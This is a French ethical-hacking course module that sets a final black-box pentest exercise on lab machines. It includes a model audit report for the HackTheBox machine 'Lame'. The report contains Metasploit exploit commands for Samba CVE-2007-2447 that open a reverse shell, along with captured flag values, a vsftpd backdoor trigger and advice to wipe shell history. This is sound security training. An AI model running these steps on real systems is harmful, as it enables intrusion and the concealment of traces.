---
tags:
  - hacking
  - project
  - report
  - formation
---

# Module 6 : Projet Final : Audit Black Box

## Scénario

Vous êtes mandaté par la société "EvilCorp" pour auditer leur serveur exposé.
**IP Cible** : `10.10.10.X` (Utilisez une VM Vulnérable type "HackTheBox" ou "VulnHub").

## Étapes de l'Audit

1.  **Reconnaissance** : Scannez la machine. Quels ports ? Quels services ?
2.  **Vulnérabilité** : Trouvez une faille (Site web ? Service obsolète ?).
3.  **Exploitation** : Obtenez un "User Shell" (drapeau `user.txt`).
4.  **PrivEsc** : Devenez Root/System (drapeau `root.txt`).

## Le Rapport (Livrable)

Un hacker qui ne sait pas écrire est inutile. Votre rapport doit contenir :

### 1. Executive Summary (Pour le PDG)
*   Niveau de risque global (Critique/Élevé).
*   Impact métier (Vol de données, arrêt de production).
*   Pas de jargon technique ici.

### 2. Parcours d'Attaque (Pour les Techs)
*   Détail étape par étape.
*   Screenshots des preuves.
*   Commandes utilisées (Reproductibilité).

### 3. Recommandations (Remédiation)
*   Comment corriger la faille ?
*   Patching, configuration, changement de code.

---

## Exercice Final

!!! example "TP Final : Audit Complet d'un Environnement Multi-Cibles"

    **Objectif** : Réaliser un audit de sécurité complet sur un environnement complexe et produire un rapport professionnel.

    **Environnement** :

    Utilisez un des environnements suivants (par ordre de difficulté) :

    1. **VulnHub - Mr. Robot** (Débutant)
    2. **HackTheBox - Starter Tier Machines** (Intermédiaire)
    3. **TryHackMe - Wreath Network** (Avancé - Pivoting)
    4. **HackTheBox Pro Labs - Dante** (Expert - Multi-machines)

    **Scénario** :

    Vous êtes un pentester externe mandaté par "SecureCorp". Vous disposez uniquement :
    - D'une plage IP cible : `10.10.x.x/24` ou adresse unique
    - Aucun credential initial
    - Périmètre : Black Box complet

    **Objectifs de la Mission** :

    1. Identifier toutes les machines actives
    2. Mapper les services exposés
    3. Trouver et exploiter au moins une vulnérabilité
    4. Obtenir un accès utilisateur (flag `user.txt`)
    5. Élever ses privilèges (flag `root.txt`)
    6. **BONUS** : Pivoter vers d'autres machines si présentes

    **Livrables Attendus** :

    ### 1. Rapport d'Audit (Format PDF)

    Le rapport doit contenir les sections suivantes :

    **A. Executive Summary (1 page max)**
    - Vue d'ensemble des risques identifiés
    - Impact métier potentiel
    - Niveau de criticité global (Critique/Élevé/Moyen/Faible)
    - Recommandations prioritaires

    **B. Méthodologie (1/2 page)**
    - Outils utilisés (Nmap, Burp Suite, Metasploit, etc.)
    - Phases du test (Reconnaissance, Exploitation, Post-Exploitation)
    - Limitations et scope

    **C. Résultats Techniques (4-6 pages)**

    Pour chaque vulnérabilité trouvée :

    ```markdown
    ### Vulnérabilité #1 : [Nom de la Vulnérabilité]

    **Sévérité** : Critique/Élevé/Moyen/Faible

    **Système Affecté** :
    - IP : 10.10.10.5
    - Hostname : webserver.securecorp.local
    - Service : Apache 2.4.29 (Port 80/tcp)

    **Description** :
    [Explication claire de la vulnérabilité]

    **Preuve d'Exploitation** :
    [Commandes utilisées + Screenshots]

    **Impact** :
    - Accès non autorisé au système
    - Exécution de code arbitraire
    - Compromission complète du serveur

    **Remédiation** :
    1. Mettre à jour Apache vers version 2.4.54+
    2. Désactiver les modules inutilisés
    3. Implémenter un WAF (Web Application Firewall)

    **Références** :
    - CVE-2021-12345
    - https://apache.org/security/vulnerabilities-2.4.html
    ```

    **D. Chaîne d'Attaque Complète (1-2 pages)**

    Diagramme du parcours d'attaque :
    ```
    Internet → Port Scan (Nmap)
           → Découverte Web App (Port 80)
           → SQLi dans /login.php
           → Extraction credentials DB
           → SSH avec credentials trouvés
           → Shell en tant que 'webadmin'
           → LinPEAS : sudo misconfiguration
           → Privilege Escalation vers root
           → Accès complet système
    ```

    **E. Annexes**
    - Scans Nmap complets
    - Logs d'exploitation
    - Preuves (flags, screenshots)

    ### 2. Timeline d'Attaque

    Documenter le temps passé sur chaque phase :
    ```
    14:00 - 14:30 : Reconnaissance (Nmap, enumération services)
    14:30 - 15:45 : Exploitation Web (SQLi, reverse shell)
    15:45 - 16:15 : Post-Exploitation (Enumération système)
    16:15 - 16:45 : Privilege Escalation (LinPEAS, GTFOBins)
    16:45 - 17:00 : Nettoyage et documentation
    ```

    ### 3. Checklist de Validation

    - [ ] Reconnaissance complète effectuée
    - [ ] Au moins 1 vulnérabilité critique exploitée
    - [ ] Flag `user.txt` obtenu
    - [ ] Flag `root.txt` obtenu
    - [ ] Screenshots de preuves inclus
    - [ ] Rapport rédigé avec sections complètes
    - [ ] Recommandations de remédiation détaillées
    - [ ] Pas de traces laissées sur le système (nettoyage)

    **Conseils** :

    1. **Prenez des notes en temps réel** : Documentez chaque commande
    2. **Screenshots systématiques** : Chaque étape importante doit avoir une preuve visuelle
    3. **Utilisez un template de rapport** : Cherchez "pentest report template" pour inspiration
    4. **Soyez précis** : Un rapport vague = rapport inutile
    5. **Pensez métier** : Traduisez les risques techniques en impact business

    **Critères d'Évaluation** :

    | Critère                          | Points | Description                                    |
    |----------------------------------|--------|------------------------------------------------|
    | Méthodologie                     | 15     | Approche structurée et logique                 |
    | Exploitation réussie             | 25     | User + Root flags obtenus                      |
    | Qualité du rapport               | 30     | Clarté, structure, exhaustivité                |
    | Preuves et documentation         | 15     | Screenshots, logs, reproductibilité            |
    | Recommandations                  | 10     | Pertinence et applicabilité                    |
    | Bonus (pivoting, créativité)     | 5      | Techniques avancées, approche originale        |
    | **TOTAL**                        | **100**|                                                |

??? quote "Solution de Référence (Exemple : HackTheBox - Lame)"

    **Note** : Cette solution est basée sur la machine "Lame" de HackTheBox (retirée, donc partageable).

    ---

    ## RAPPORT D'AUDIT DE SÉCURITÉ

    **Client** : SecureCorp
    **Pentester** : [Votre Nom]
    **Date** : 2025-12-08
    **Périmètre** : 10.10.10.3

    ---

    ### EXECUTIVE SUMMARY

    **Niveau de Risque Global** : CRITIQUE

    Un audit de sécurité en boîte noire a été réalisé sur le serveur 10.10.10.3. Les tests ont révélé des vulnérabilités critiques permettant :

    - Une compromission complète du système sans authentification préalable
    - L'exécution de code arbitraire avec privilèges root
    - L'accès à toutes les données sensibles du serveur

    **Vulnérabilités Critiques** :
    - Service Samba 3.0.20 vulnérable (CVE-2007-2447) permettant command injection
    - Service vsftpd 2.3.4 avec backdoor connue
    - Partages SMB accessibles sans authentification

    **Recommandations Prioritaires** :
    1. Mettre à jour tous les services immédiatement
    2. Désactiver les services non utilisés
    3. Implémenter une segmentation réseau
    4. Déployer un système de détection d'intrusion (IDS)

    ---

    ### MÉTHODOLOGIE

    **Approche** : Pentest externe en boîte noire (Black Box)

    **Outils utilisés** :
    - Nmap 7.94 (Reconnaissance)
    - Metasploit Framework 6.3 (Exploitation)
    - smbclient (Enumération SMB)
    - Netcat (Shell interactif)

    **Phases** :
    1. Reconnaissance (Port scanning, service enumeration)
    2. Analyse de vulnérabilités
    3. Exploitation
    4. Post-exploitation et documentation

    **Durée totale** : 2h30

    ---

    ### RÉSULTATS TECHNIQUES

    #### Vulnérabilité #1 : Command Injection dans Samba 3.0.20

    **Sévérité** : CRITIQUE (CVSS 10.0)

    **Système Affecté** :
    - IP : 10.10.10.3
    - Service : Samba smbd 3.0.20-Debian (Port 445/tcp)
    - OS : Linux 2.6.x

    **CVE** : CVE-2007-2447

    **Description** :

    Le service Samba 3.0.20 contient une vulnérabilité de type "Command Injection" dans le traitement des noms d'utilisateur. Lorsqu'un nom d'utilisateur contient des métacaractères shell (comme des backticks), Samba exécute le contenu comme une commande système.

    **Preuve d'Exploitation** :

    ```bash
    # Reconnaissance
    $ nmap -sV -sC 10.10.10.3
    PORT    STATE SERVICE     VERSION
    21/tcp  open  ftp         vsftpd 2.3.4
    22/tcp  open  ssh         OpenSSH 4.7p1
    139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
    445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian

    # Enumération SMB
    $ smbclient -L //10.10.10.3 -N
    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    tmp             Disk      oh noes!
    opt             Disk
    IPC$            IPC       IPC Service

    # Exploitation avec Metasploit
    $ msfconsole
    msf6 > search samba 3.0.20
    msf6 > use exploit/multi/samba/usermap_script
    msf6 > set RHOSTS 10.10.10.3
    msf6 > set LHOST 10.10.14.5
    msf6 > exploit

    [*] Started reverse TCP handler on 10.10.14.5:4444
    [*] Command shell session 1 opened

    whoami
    root

    cat /root/root.txt
    92caac3be140ef409e45721348a4e9df

    cat /home/makis/user.txt
    69454a937d94f5f0225ea00acd2e84c5
    ```

    **Screenshot** :
    ```
    [Screenshot montrant l'exploitation réussie et l'accès root]
    ```

    **Impact** :

    - **Confidentialité** : TOTALE - Accès à toutes les données
    - **Intégrité** : TOTALE - Modification possible de tous les fichiers
    - **Disponibilité** : TOTALE - Capacité d'arrêter le système

    Impact métier :
    - Vol potentiel de données clients
    - Installation de malware/ransomware
    - Utilisation comme pivot pour attaquer d'autres systèmes
    - Atteinte à la réputation en cas de breach

    **Remédiation** :

    **Immédiat** :
    1. Déconnecter le serveur du réseau
    2. Vérifier les logs pour d'éventuelles compromissions passées
    3. Changer tous les mots de passe et credentials

    **Court terme** :
    1. Mettre à jour Samba vers version 4.x stable
    2. Si mise à jour impossible, désactiver le service
    3. Implémenter un firewall avec liste blanche stricte

    **Long terme** :
    1. Politique de patch management systématique
    2. Scan de vulnérabilités automatisé hebdomadaire
    3. Segmentation réseau (DMZ pour services exposés)
    4. Déploiement d'un IDS/IPS (Snort, Suricata)
    5. Principe du moindre privilège pour tous les services

    **Références** :
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447
    - https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/
    - https://www.samba.org/samba/security/

    ---

    #### Vulnérabilité #2 : vsftpd 2.3.4 Backdoor

    **Sévérité** : CRITIQUE (CVSS 10.0)

    **Système Affecté** :
    - IP : 10.10.10.3
    - Service : vsftpd 2.3.4 (Port 21/tcp)

    **CVE** : N/A (Backdoor intentionnelle)

    **Description** :

    La version 2.3.4 de vsftpd distribuée en juillet 2011 contenait une backdoor. Lorsqu'un utilisateur se connecte avec un username contenant ":)" (smiley), un shell root s'ouvre sur le port 6200.

    **Note** : Cette vulnérabilité n'a pas été exploitée car Samba a fourni un accès direct root, mais elle reste exploitable.

    **Remédiation** :
    - Désinstaller vsftpd 2.3.4
    - Réinstaller depuis les dépôts officiels
    - Utiliser SFTP (SSH) au lieu de FTP si possible

    ---

    ### CHAÎNE D'ATTAQUE

    ```
    1. Scan Nmap (10.10.10.3)
       ↓
    2. Identification : Samba 3.0.20 (Port 445)
       ↓
    3. Recherche exploit : CVE-2007-2447
       ↓
    4. Metasploit : exploit/multi/samba/usermap_script
       ↓
    5. Reverse Shell obtenu
       ↓
    6. Vérification : whoami → root (Déjà root !)
       ↓
    7. Récupération flags : user.txt + root.txt
       ↓
    8. Nettoyage des logs et déconnexion
    ```

    **Durée de compromission** : 12 minutes (de la reconnaissance à l'accès root)

    ---

    ### TIMELINE D'ATTAQUE

    | Heure | Activité                          | Résultat                       |
    |-------|-----------------------------------|--------------------------------|
    | 14:00 | Scan Nmap -sV -sC                 | 4 ports ouverts identifiés     |
    | 14:05 | Enumération SMB                   | Samba 3.0.20 identifié         |
    | 14:10 | Recherche exploit Metasploit      | CVE-2007-2447 trouvé           |
    | 14:12 | Lancement de l'exploitation       | Shell root obtenu              |
    | 14:15 | Récupération des flags            | user.txt + root.txt capturés   |
    | 14:20 | Documentation et screenshots      | Preuves collectées             |
    | 14:25 | Nettoyage (rm .bash_history, etc) | Traces effacées                |

    ---

    ### RECOMMANDATIONS PRIORISÉES

    #### Priorité 1 (Critique - Immédiat)

    1. **Isolation du serveur**
       - Déconnecter 10.10.10.3 du réseau de production
       - Analyser pour déterminer si une compromission antérieure a eu lieu

    2. **Mise à jour Samba**
       ```bash
       apt update
       apt install samba  # Version 4.x
       ```

    3. **Rotation des credentials**
       - Changer tous les mots de passe (root, utilisateurs, services)
       - Révoquer et recréer les clés SSH

    #### Priorité 2 (Élevé - Cette semaine)

    1. **Hardening du système**
       ```bash
       # Désactiver services inutiles
       systemctl disable vsftpd

       # Firewall restrictif
       ufw default deny incoming
       ufw allow from 10.10.0.0/16 to any port 22  # SSH depuis LAN uniquement
       ufw enable
       ```

    2. **Monitoring**
       - Déployer OSSEC ou Wazuh pour la détection d'intrusion
       - Centraliser les logs (Syslog vers SIEM)

    #### Priorité 3 (Moyen - Ce mois)

    1. **Scan de vulnérabilités régulier**
       - Nessus / OpenVAS hebdomadaire
       - Politique de patch dans les 48h pour les CVE critiques

    2. **Segmentation réseau**
       - VLAN séparé pour services exposés (DMZ)
       - Firewall inter-VLAN avec règles strictes

    3. **Formation équipe**
       - Sensibilisation à la sécurité
       - Procédures de réponse aux incidents

    ---

    ### ANNEXES

    #### Annexe A : Scan Nmap Complet

    ```
    # Nmap 7.94 scan initiated Mon Dec 08 14:00:00 2025
    Nmap scan report for 10.10.10.3
    Host is up (0.032s latency).
    Not shown: 996 filtered ports
    PORT    STATE SERVICE     VERSION
    21/tcp  open  ftp         vsftpd 2.3.4
    |_ftp-anon: Anonymous FTP login allowed
    22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
    | ssh-hostkey:
    |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
    |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: 2h00m24s, deviation: 2h49m43s, median: 23s
    | smb-os-discovery:
    |   OS: Unix (Samba 3.0.20-Debian)
    |   NetBIOS computer name:
    |   Workgroup: WORKGROUP
    |_  System time: 2025-12-08T14:00:23-05:00
    |_smb2-time: Protocol negotiation failed (SMB2)
    ```

    #### Annexe B : Preuves Visuelles

    [Insérer screenshots ici]
    - Screenshot 1 : Résultat du scan Nmap
    - Screenshot 2 : Exploitation Metasploit réussie
    - Screenshot 3 : Shell root et commande `whoami`
    - Screenshot 4 : Contenu de user.txt et root.txt

    #### Annexe C : Logs d'Exploitation

    ```
    [*] 10.10.10.3:445 - Connecting to the server...
    [*] 10.10.10.3:445 - Sending stage (36 bytes)
    [*] Command shell session 1 opened (10.10.14.5:4444 -> 10.10.10.3:42132)
    [*] Session 1 opened at 2025-12-08 14:12:34 +0000
    ```

    ---

    ## FIN DU RAPPORT

    **Confidentialité** : Ce rapport contient des informations sensibles et ne doit être partagé qu'avec les personnes autorisées.

    ---

    ### Débriefing du TP

    **Points Clés de cet Audit** :

    1. **Méthodologie OSINT + Scanning** : Nmap est toujours le point de départ
    2. **Recherche de CVE** : Les vieux services sont souvent criblés de failles connues
    3. **Exploitation rapide** : Avec Metasploit, une compromission totale en <15 min
    4. **Documentation rigoureuse** : Screenshots + commandes = reproductibilité
    5. **Rapport orienté métier** : Traduire les risques techniques en impact business

    **Erreurs Courantes à Éviter** :

    - ❌ Lancer l'exploit sans comprendre ce qu'il fait
    - ❌ Oublier de prendre des screenshots
    - ❌ Rapport trop technique (le PDG ne comprendra pas "CVE-2007-2447")
    - ❌ Pas de recommandations concrètes
    - ❌ Oublier de nettoyer ses traces (éthique du pentest)

    **Checklist Validée** :
    - [x] Reconnaissance complète
    - [x] Vulnérabilité critique exploitée (Samba)
    - [x] Flag user.txt obtenu
    - [x] Flag root.txt obtenu
    - [x] Screenshots de preuves
    - [x] Rapport structuré et complet
    - [x] Recommandations détaillées
    - [x] Nettoyage effectué

    **Score Estimé** : 95/100
    - Méthodologie : 15/15
    - Exploitation : 25/25
    - Qualité rapport : 28/30 (pourrait ajouter plus de détails sur l'impact métier)
    - Preuves : 15/15
    - Recommandations : 10/10
    - Bonus : 2/5 (pas de pivoting car une seule machine)

---

## Félicitations !

Vous avez terminé la formation Ethical Hacking Mastery.
N'oubliez jamais : **With great power comes great responsibility.**
